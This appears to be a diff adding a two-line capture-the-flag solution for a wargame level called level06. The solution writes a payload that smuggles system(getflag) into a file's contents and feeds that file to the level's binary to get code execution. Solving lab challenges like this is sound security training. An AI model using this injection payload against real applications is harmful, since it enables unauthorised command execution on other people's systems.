@@ -1,0 +1,2 @@
+-> echo '[x {${system(getflag)}}]' > /tmp/tata
+-> ./level06 /tmp/tata t 2>&-
